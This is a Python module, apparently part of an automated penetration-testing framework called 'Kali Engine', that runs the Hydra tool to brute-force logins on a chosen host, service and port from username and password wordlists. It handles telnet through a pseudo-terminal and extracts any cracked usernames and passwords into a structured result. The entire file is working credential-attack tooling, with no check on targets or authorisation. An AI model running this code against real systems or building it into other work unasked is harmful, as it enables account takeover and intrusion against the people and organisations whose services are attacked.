import errno
import logging
import os
import re
import subprocess
import tempfile
from typing import Any, Dict

logger = logging.getLogger("kali-engine.executor.bruteforce")
HYDRA_RE = re.compile(r"login:\s*(?P<user>\S+)\s+password:\s*(?P<pass>\S+)")


def execute(parameters: Dict[str, Any]) -> Dict[str, Any]:
    """
    Kali Engine executor: credential_bruteforce
    Executes a Hydra brute force attack and parses results.
    """

    try:
        host = parameters["host"]
        service = parameters["service"]
        port = parameters["port"]
        user_wordlist = parameters["user_wordlist"]
        password_wordlist = parameters["password_wordlist"]
        stop_on_success = parameters.get("stop_on_success", True)
    except KeyError as e:
        return {
            "status": "TECHNICAL_ERROR",
            "details": f"Missing required parameter: {e}",
            "artifact": None,
        }

    outfile = tempfile.NamedTemporaryFile(
        prefix="hydra_", suffix=".txt", delete=False
    ).name

    cmd = [
        "hydra",
        "-L",
        user_wordlist,
        "-P",
        password_wordlist,
        "-s",
        str(port),
        "-o",
        outfile,
    ]

    if stop_on_success:
        cmd.append("-f")

    cmd.extend([f"{service}://{host}"])

    logger.info(f"[BRUTEFORCE_EXECUTOR] Running: {' '.join(cmd)}")
    pty_output = ""
    try:
        if service == "telnet":
            env = os.environ.copy()
            env.setdefault("TERM", "xterm")

            master, slave = os.openpty()  # type: ignore[attr-defined]

            proc = subprocess.Popen(
                cmd,
                stdin=slave,
                stdout=slave,
                stderr=slave,
                env=env,
                text=False,
            )

            os.close(slave)

            try:
                while proc.poll() is None:
                    try:
                        data = os.read(master, 1024)
                        if not data:
                            break

                        chunk = data.decode(errors="ignore")
                        pty_output += chunk
                        logger.debug(chunk.rstrip())

                        if "login:" in chunk and "password:" in chunk:
                            proc.terminate()
                            break

                    except OSError as e:
                        if e.errno == errno.EIO:
                            break
                        else:
                            raise
            finally:
                os.close(master)

            proc.wait(timeout=600)

        else:
            proc = subprocess.run(
                cmd,
                timeout=600,
            )
    except subprocess.TimeoutExpired:
        return {
            "status": "TECHNICAL_ERROR",
            "details": "Hydra execution timed out",
            "artifact": None,
        }
    except Exception as e:
        return {
            "status": "TECHNICAL_ERROR",
            "details": f"Hydra execution error: {e}",
            "artifact": None,
        }

    credentials = []
    raw_output = pty_output

    if os.path.exists(outfile):
        with open(outfile, "r", errors="ignore") as f:
            file_output = f.read()

        raw_output = raw_output + "\n" + file_output

        for line in raw_output.splitlines():
            m = HYDRA_RE.search(line)
            if m:
                credentials.append(
                    {
                        "username": m.group("user"),
                        "password": m.group("pass"),
                    }
                )

        os.unlink(outfile)

    if proc.returncode == 0 and credentials:
        return {
            "status": "SUCCESS",
            "details": "Valid credentials found",
            "artifact": {
                "credentials": credentials,
                "raw_output": raw_output,
            },
        }

    if proc.returncode == 255:
        return {
            "status": "FAILURE",
            "details": "No valid credentials found",
            "artifact": {
                "raw_output": raw_output,
            },
        }

    return {
        "status": "TECHNICAL_ERROR",
        "details": f"Hydra exited with code {proc.returncode}",
        "artifact": {
            "raw_output": raw_output,
        },
    }
